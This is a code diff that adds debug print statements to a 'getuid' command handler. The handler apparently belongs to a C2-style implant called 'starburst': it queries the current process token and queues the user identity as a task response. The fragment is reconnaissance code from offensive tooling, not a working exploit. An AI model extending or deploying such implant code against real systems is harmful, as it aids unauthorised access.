@@ -24,15 +24,18 @@ auto declfn starburst::cmd_getuid(
     (void)params;
 
     DBG_PRINT( inst, "cmd_getuid\n" );
+    DBG_PRINT( inst, "getuid:enter\n" );
 
     HANDLE h_token = nullptr;
     HANDLE h_proc = reinterpret_cast<HANDLE>( static_cast<intptr_t>( -1 ) );
 
     if ( !SCALL( inst, advapi32.OpenProcessToken, h_proc, TOKEN_QUERY, &h_token ) ) {
+        DBG_PRINT( inst, "getuid:OpenProcessToken_fail\n" );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "OpenProcessToken failed" ) ) );
         return;
     }
+    DBG_PRINT( inst, "getuid:token_ok\n" );
 
     uint32_t out_cap = 1024;
     auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
@@ -172,7 +175,9 @@ auto declfn starburst::cmd_getuid(
     output[off] = '\0';
 
     SCALL( inst, kernel32.CloseHandle, h_token );
+    DBG_PRINT( inst, "getuid:queue_response\n" );
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
+    DBG_PRINT( inst, "getuid:queued\n" );
     inst.heap_free( output );
 }
 
